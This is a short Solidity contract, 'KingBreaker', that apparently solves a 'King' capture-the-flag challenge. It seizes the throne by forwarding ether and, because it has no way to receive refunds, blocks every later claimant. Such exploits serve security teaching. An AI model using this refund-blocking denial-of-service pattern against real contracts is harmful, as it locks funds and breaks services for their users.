// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

contract KingBreaker {
    constructor() payable {
    }

  function becomeKing(address payable king) public payable {
    king.transfer(msg.value);
  }
}